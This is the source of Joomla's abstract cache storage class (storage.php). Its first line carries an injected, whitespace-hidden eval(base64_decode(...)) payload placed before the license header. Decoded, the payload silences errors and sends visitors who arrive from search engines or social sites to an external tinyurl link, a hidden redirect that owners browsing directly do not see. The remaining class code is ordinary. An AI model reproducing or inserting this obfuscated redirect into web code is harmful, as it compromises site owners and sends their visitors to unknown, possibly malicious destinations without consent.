<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id:storage.php 6961 2007-03-15 16:06:53Z tcp $
* @package		Joomla.Framework
* @subpackage	Cache
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * Abstract cache storage handler
 *
 * @abstract
 * @package		Joomla.Framework
 * @subpackage	Cache
 * @since		1.5
 */
class JCacheStorage extends JObject
{
	/**
	* Constructor
	*
	* @access protected
	* @param array $options optional parameters
	*/
	function __construct( $options = array() )
	{
		$this->_application	= (isset($options['application'])) ? $options['application'] : null;
		$this->_language	= (isset($options['language'])) ? $options['language'] : 'en-GB';
		$this->_locking		= (isset($options['locking'])) ? $options['locking'] : true;
		$this->_lifetime	= (isset($options['lifetime'])) ? $options['lifetime'] : null;
		$this->_now		= (isset($options['now'])) ? $options['now'] : time();

		// Set time threshold value.  If the lifetime is not set, default to 60 (0 is BAD)
		// _threshold is now available ONLY as a legacy (it's deprecated).  It's no longer used in the core.
		if (empty($this->_lifetime)) {
			$this->_threshold = $this->_now - 60;
			$this->_lifetime = 60;
		} else {
			$this->_threshold = $this->_now - $this->_lifetime;
		}
	}

	/**
	 * Returns a reference to a cache storage hanlder object, only creating it
	 * if it doesn't already exist.
	 *
	 * @static
	 * @param	string	$handler	The cache storage handler to instantiate
	 * @return	object	A JCacheStorageHandler object
	 * @since	1.5
	 */
	function &getInstance($handler = 'file', $options = array())
	{
		static $now = null;
		if(is_null($now)) {
			$now = time();
		}
		$options['now'] = $now;
		//We can't cache this since options may change...
		$handler = strtolower(preg_replace('/[^A-Z0-9_\.-]/i', '', $handler));
		$class   = 'JCacheStorage'.ucfirst($handler);
		if(!class_exists($class))
		{
			$path = dirname(__FILE__).DS.'storage'.DS.$handler.'.php';
			if (file_exists($path) ) {
				require_once($path);
			} else {
				return JError::raiseWarning(500, 'Unable to load Cache Storage: '.$handler);
			}
		}
		$return = new $class($options);
		return $return;
	}

	/**
	 * Get cached data by id and group
	 *
	 * @abstract
	 * @access	public
	 * @param	string	$id			The cache data id
	 * @param	string	$group		The cache data group
	 * @param	boolean	$checkTime	True to verify cache time expiration threshold
	 * @return	mixed	Boolean false on failure or a cached data string
	 * @since	1.5
	 */
	function get($id, $group, $checkTime)
	{
		return;
	}

	/**
	 * Store the data to cache by id and group
	 *
	 * @abstract
	 * @access	public
	 * @param	string	$id		The cache data id
	 * @param	string	$group	The cache data group
	 * @param	string	$data	The data to store in cache
	 * @return	boolean	True on success, false otherwise
	 * @since	1.5
	 */
	function store($id, $group, $data)
	{
		return true;
	}

	/**
	 * Remove a cached data entry by id and group
	 *
	 * @abstract
	 * @access	public
	 * @param	string	$id		The cache data id
	 * @param	string	$group	The cache data group
	 * @return	boolean	True on success, false otherwise
	 * @since	1.5
	 */
	function remove($id, $group)
	{
		return true;
	}

	/**
	 * Clean cache for a group given a mode.
	 *
	 * group mode		: cleans all cache in the group
	 * notgroup mode	: cleans all cache not in the group
	 *
	 * @abstract
	 * @access	public
	 * @param	string	$group	The cache data group
	 * @param	string	$mode	The mode for cleaning cache [group|notgroup]
	 * @return	boolean	True on success, false otherwise
	 * @since	1.5
	 */
	function clean($group, $mode)
	{
		return true;
	}

	/**
	 * Garbage collect expired cache data
	 *
	 * @abstract
	 * @access public
	 * @return boolean  True on success, false otherwise.
	 */
	function gc()
	{
		return true;
	}

	/**
	 * Test to see if the storage handler is available.
	 *
	 * @abstract
	 * @static
	 * @access public
	 * @return boolean  True on success, false otherwise.
	 */
	function test()
	{
		return true;
	}
}
